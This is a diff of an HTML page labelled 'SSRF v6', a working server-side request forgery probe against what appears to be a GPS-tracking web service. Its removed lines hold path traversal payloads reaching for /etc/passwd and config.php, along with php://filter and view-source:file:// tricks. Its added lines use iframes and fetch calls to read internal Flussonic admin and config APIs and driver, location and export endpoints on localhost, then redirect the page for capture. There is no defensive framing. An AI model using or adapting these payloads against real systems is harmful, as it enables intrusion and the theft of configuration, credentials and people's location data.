@@ -1,179 +1,125 @@
 <!DOCTYPE html>
-<html>
-<head><title>R</title>
+<html><head><title>R</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font:7px/1.1 monospace;margin:2px}
+body{font:6px/1.05 monospace;margin:1px}
 .s{border:1px solid #000;margin:1px 0}
-h3{font-size:8px;background:#ccc;padding:1px 2px}
+h3{font-size:7px;background:#ccc;padding:0 2px}
 iframe{width:100%;border:0}
-pre{white-space:pre-wrap;font-size:6px;background:#f5f5f5;padding:1px;word-break:break-all}
+pre{white-space:pre-wrap;font-size:5.5px;background:#f5f5f5;padding:1px;word-break:break-all}
 </style>
 </head>
 <body>
-<b>SSRF v6 - File Read + Path Traversal</b>
+<b>SSRF v6 - Flussonic + deep dive</b>
 
-<!-- 1. view-source: protocol attempts -->
-<div class="s">
-<h3>1. view-source:file:///etc/passwd</h3>
-<iframe style="height:100px" src="view-source:file:///etc/passwd"></iframe>
-</div>
+<!-- Flussonic admin panel - LARGE iframe to capture full render -->
+<div class="s"><h3>Flussonic /admin/ (full)</h3>
+<iframe style="height:400px" src="https://127.0.0.1/flussonic/admin/"></iframe></div>
 
-<div class="s">
-<h3>2. view-source:https://127.0.0.1/backend/ax/init.php</h3>
-<iframe style="height:100px" src="view-source:https://127.0.0.1/backend/ax/init.php"></iframe>
-</div>
+<!-- Flussonic API endpoints - localhost may bypass auth -->
+<div class="s"><h3>Flussonic /api/v3/streams</h3>
+<iframe style="height:100px" src="https://127.0.0.1/flussonic/api/v3/streams"></iframe></div>
 
-<!-- 3. Path traversal variants on get_upload_report.php from localhost -->
-<div class="s">
-<h3>3a. get_upload_report: ..%2fconfig.php</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%2fconfig.php&node=3"></iframe>
-</div>
+<div class="s"><h3>Flussonic /api/v2/media</h3>
+<iframe style="height:100px" src="https://127.0.0.1/flussonic/api/v2/media"></iframe></div>
 
-<div class="s">
-<h3>3b. get_upload_report: ..%252f..%252f..%252fetc%252fpasswd</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252f..%252f..%252f..%252fetc%252fpasswd&node=3"></iframe>
-</div>
+<div class="s"><h3>Flussonic /api/server</h3>
+<iframe style="height:100px" src="https://127.0.0.1/flussonic/api/server"></iframe></div>
 
-<div class="s">
-<h3>3c. get_upload_report: ....//....//....//....//etc/passwd</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=....//....//....//....//etc/passwd&node=3"></iframe>
-</div>
+<div class="s"><h3>Flussonic /streamer/api/v3/streams</h3>
+<iframe style="height:80px" src="https://127.0.0.1/streamer/api/v3/streams"></iframe></div>
 
-<div class="s">
-<h3>3d. get_upload_report: ..%5c..%5c..%5c..%5cetc%5cpasswd</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%5c..%5c..%5c..%5cetc%5cpasswd&node=3"></iframe>
-</div>
+<!-- Key internal pages - larger for full content -->
+<div class="s"><h3>/ (login page full)</h3>
+<iframe style="height:300px" src="https://127.0.0.1/"></iframe></div>
 
-<div class="s">
-<h3>3e. get_upload_report: ..././..././..././..././etc/passwd</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..././..././..././..././etc/passwd&node=3"></iframe>
-</div>
+<div class="s"><h3>/ax/reports.php?node=3</h3>
+<iframe style="height:120px" src="https://127.0.0.1/ax/reports.php?node=3"></iframe></div>
 
-<div class="s">
-<h3>3f. get_upload_report: ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd&node=3"></iframe>
-</div>
+<div class="s"><h3>/backend/ax/init.php (retry)</h3>
+<iframe style="height:150px" src="https://127.0.0.1/backend/ax/init.php"></iframe></div>
 
-<div class="s">
-<h3>3g. get_upload_report: /etc/passwd (absolute)</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=/etc/passwd&node=3"></iframe>
-</div>
+<div class="s"><h3>/ax/init.php (alt path)</h3>
+<iframe style="height:100px" src="https://127.0.0.1/ax/init.php"></iframe></div>
 
-<div class="s">
-<h3>3h. get_upload_report: ...//...//...//...//...//../etc/passwd</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=...//...//...//...//...//../etc/passwd&node=3"></iframe>
-</div>
+<!-- Try common Flussonic ports -->
+<div class="s"><h3>:8080/flussonic/admin/</h3>
+<iframe style="height:100px" src="https://127.0.0.1:8080/flussonic/admin/"></iframe></div>
 
-<!-- 4. init.php full render (larger iframe to capture more) -->
-<div class="s">
-<h3>4. INIT.PHP (full response from localhost)</h3>
-<iframe style="height:300px" src="https://127.0.0.1/backend/ax/init.php"></iframe>
-</div>
+<div class="s"><h3>:1935/ (RTMP)</h3>
+<iframe style="height:60px" src="https://127.0.0.1:1935/"></iframe></div>
 
-<!-- 5. Try to read config via PHP wrappers if available -->
-<div class="s">
-<h3>5a. php://filter on init.php</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=php://filter/convert.base64-encode/resource=../config.php&node=3"></iframe>
-</div>
+<div class="s"><h3>:8443/flussonic/admin/</h3>
+<iframe style="height:80px" src="https://127.0.0.1:8443/flussonic/admin/"></iframe></div>
 
-<div class="s">
-<h3>5b. php://filter direct</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=php://filter/convert.base64-encode/resource=/etc/passwd&node=3"></iframe>
-</div>
+<!-- Direct Pilot GPS internal endpoints -->
+<div class="s"><h3>/backend/ax/current_data.php?node=3</h3>
+<iframe style="height:80px" src="https://127.0.0.1/backend/ax/current_data.php?node=3"></iframe></div>
 
-<!-- 6. WebSocket test to port 8080 -->
-<div class="s">
-<h3>6. WebSocket + fetch results</h3>
-<pre id="r">scanning...</pre>
-</div>
+<div class="s"><h3>/backend/ax/drivers.php?node=3</h3>
+<iframe style="height:80px" src="https://127.0.0.1/backend/ax/drivers.php?node=3"></iframe></div>
 
-<!-- 7. Try accessing debug/admin endpoints -->
-<div class="s">
-<h3>7a. /backend/ax/login.php</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/login.php"></iframe>
-</div>
+<div class="s"><h3>/backend/ax/export.php?node=3</h3>
+<iframe style="height:80px" src="https://127.0.0.1/backend/ax/export.php?node=3"></iframe></div>
 
-<div class="s">
-<h3>7b. /backend/ax/session.php</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/session.php"></iframe>
-</div>
+<div class="s"><h3>/backend/ax/status_history.php?node=3</h3>
+<iframe style="height:80px" src="https://127.0.0.1/backend/ax/status_history.php?node=3"></iframe></div>
 
-<div class="s">
-<h3>7c. /backend/ax/admin.php</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/admin.php"></iframe>
-</div>
-
-<div class="s">
-<h3>7d. /backend/ax/users.php</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/users.php"></iframe>
-</div>
-
-<div class="s">
-<h3>7e. /backend/ax/accounts.php</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/accounts.php"></iframe>
-</div>
-
-<div class="s">
-<h3>7f. /backend/cron.php</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/cron.php"></iframe>
-</div>
-
-<div class="s">
-<h3>7g. /backend/ax/get_gpx_file.php?track_id=1&node=3</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/get_gpx_file.php?track_id=1&node=3"></iframe>
-</div>
+<!-- JS fetch with HTTPS to bypass mixed content -->
+<div class="s"><h3>HTTPS FETCH</h3>
+<pre id="r">scanning...</pre></div>
 
 <script>
 var o='';
 function p(s){o+=s+'\n';document.getElementById('r').textContent=o}
 
-// WebSocket test to port 8080
-try {
-  var ws = new WebSocket('ws://127.0.0.1:8080/');
-  ws.onopen = function(){p('WS 8080 OPEN')};
-  ws.onmessage = function(e){p('WS MSG: '+e.data.substring(0,500))};
-  ws.onerror = function(){p('WS 8080 err')};
-  ws.onclose = function(e){p('WS 8080 close code='+e.code)};
-} catch(e){p('WS err: '+e.message)}
-
-// WebSocket to HTTPS 443
-try {
-  var ws2 = new WebSocket('wss://127.0.0.1:443/');
-  ws2.onopen = function(){p('WSS 443 OPEN')};
-  ws2.onmessage = function(e){p('WSS MSG: '+e.data.substring(0,500))};
-  ws2.onerror = function(){p('WSS 443 err')};
-  ws2.onclose = function(e){p('WSS 443 close code='+e.code)};
-} catch(e){p('WSS err: '+e.message)}
-
-// HTTP fetch with redirect follow
-async function testFetch(label, url) {
-  try {
-    var r = await fetch(url, {redirect:'follow', mode:'no-cors'});
-    p(label+': status='+r.status+' type='+r.type+' url='+r.url);
-    if(r.type!='opaque'){
-      var t = await r.text();
-      p('  BODY: '+t.substring(0,500));
-    }
-  } catch(e) {p(label+' ERR: '+e.message)}
+async function tf(l,u){
+try{var r=await fetch(u);var t=await r.text();p(l+' ['+r.status+']: '+t.substring(0,200))}
+catch(e){p(l+' ERR: '+e.message)}
 }
 
 (async function(){
-  // Try localhost PHP endpoints via fetch
-  await testFetch('init.php', 'https://127.0.0.1/backend/ax/init.php');
-  await testFetch('reports.php', 'https://127.0.0.1/backend/ax/reports.php?node=3');
-  // Try to get_upload_report with different traversals
-  await testFetch('traversal-1', 'https://127.0.0.1/backend/ax/get_upload_report.php?file_name=....//config.php&node=3');
-  await testFetch('traversal-2', 'https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252f..%252f..%252fetc%252fpasswd&node=3');
-  // Try reading config.php from known path
-  await testFetch('config-direct', 'https://127.0.0.1/backend/config.php');
-  await testFetch('config-ax', 'https://127.0.0.1/backend/ax/config.php');
-  // Try other interesting files
-  await testFetch('htaccess', 'https://127.0.0.1/.htaccess');
-  await testFetch('robots', 'https://127.0.0.1/robots.txt');
-  await testFetch('sitemap', 'https://127.0.0.1/sitemap.xml');
+// HTTPS fetches to 127.0.0.1 (bypass mixed content issue)
+await tf('init','https://127.0.0.1/backend/ax/init.php');
+await tf('init2','https://127.0.0.1/ax/init.php');
+await tf('envphp','https://127.0.0.1/ax/env.php?prj=gpsguard');
+await tf('rpts','https://127.0.0.1/ax/reports.php?node=3');
+await tf('cur','https://127.0.0.1/backend/ax/current_data.php?node=3');
+await tf('drv','https://127.0.0.1/backend/ax/drivers.php?node=3');
+await tf('exp','https://127.0.0.1/backend/ax/export.php?node=3');
+await tf('gpx','https://127.0.0.1/ax/get_gpx_file.php?track_id=1&node=3');
+await tf('gpx2','https://127.0.0.1/backend/ax/get_gpx_file.php?track_id=1&node=3');
+
+// Flussonic API via HTTPS
+await tf('fl-cfg','https://127.0.0.1/flussonic/api/read_config');
+await tf('fl-str','https://127.0.0.1/flussonic/api/streams');
+await tf('fl-srv','https://127.0.0.1/flussonic/api/server');
+await tf('fl-v3','https://127.0.0.1/flussonic/api/v3/streams');
+await tf('fl-v2','https://127.0.0.1/flussonic/api/v2/media');
+
+// Port 8080 HTTPS
+await tf('8080-fl','https://127.0.0.1:8080/flussonic/admin/');
+await tf('8080-api','https://127.0.0.1:8080/flussonic/api/read_config');
+
+// HTTP 8080 (known to work with CORS)
+await tf('8080:/','http://127.0.0.1:8080/');
+await tf('8080:fl-cfg','http://127.0.0.1:8080/flussonic/api/read_config');
+await tf('8080:fl-str','http://127.0.0.1:8080/flussonic/api/streams');
+await tf('8080:fl-srv','http://127.0.0.1:8080/flussonic/api/server');
+await tf('8080:fl-adm','http://127.0.0.1:8080/flussonic/admin/');
+
+// Try Flussonic common ports
+await tf('80:fl','http://127.0.0.1:80/flussonic/');
+await tf('8443','http://127.0.0.1:8443/');
+await tf('9090','http://127.0.0.1:9090/');
+
+p('DONE');
 })();
+
+// After 35s, redirect to Flussonic admin for full-page capture
+setTimeout(function(){
+  window.location.href = 'https://127.0.0.1/flussonic/admin/';
+}, 35000);
 </script>
 
-</body>
-</html>
+</body></html>
